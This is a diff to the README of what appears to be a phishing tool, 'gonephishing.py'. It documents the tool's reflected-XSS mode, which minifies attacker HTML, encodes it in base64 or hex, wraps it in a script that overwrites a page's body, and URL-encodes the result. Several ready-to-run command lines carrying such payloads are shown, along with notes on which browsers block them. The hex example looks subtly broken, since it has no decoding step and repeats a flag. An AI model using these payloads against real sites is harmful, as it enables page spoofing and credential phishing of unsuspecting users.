@@ -10,12 +10,19 @@ pip3 install htmlmin
 ### Usage
 
 #### Reflected XSS
-This is all very new so treat it gently. It may not have long to go (chrome browser security for example)
+This is all very new so treat it gently. It may not have long to go (chrome browser security blocks the examples given Firefox is ok IE/Edge probably okay not tested yet)
 
- * Generate a minified version of an html file and optionally base64 encode it (on by default, as it will be in most use cases so you can switch it off on the command line --base64 0), then inject it into some javascript/html and urlencode the entire string.  The javascript must contain a %s field to mark location to inject html into.  
+ * Generate a minified version of an html file and optionally encode in, then inject it into some javascript/html and urlencode the entire string.  
+ The javascript must contain a %s field to mark location to inject html into.  
+ 
+ Current supported encoders are b64 and hex.
 
 ~~~
-python3 ./gonephishing.py --xss --html "@./text.html" --js '<script>document.body.innerHTML=atob("%s")</script>'
+python3 ./gonephishing.py --xss --html "@./text.html" --js '<script>document.body.innerHTML=atob("%s")</script>'  --encoders --encoders b64
+
+python3 ./gonephishing.py --xss --html "@./text.html" --js '<script>document.body.innerHTML=("%s")</script>'  --encoders --encoders hex
+
+python3 ./gonephishing.py --xss --html "@./text.html" --js '<script>document.body.innerHTML=atob("%s")</script>'  --encoders --encoders b64,hex 
 ~~~
 
 #### GMAIL Redirect
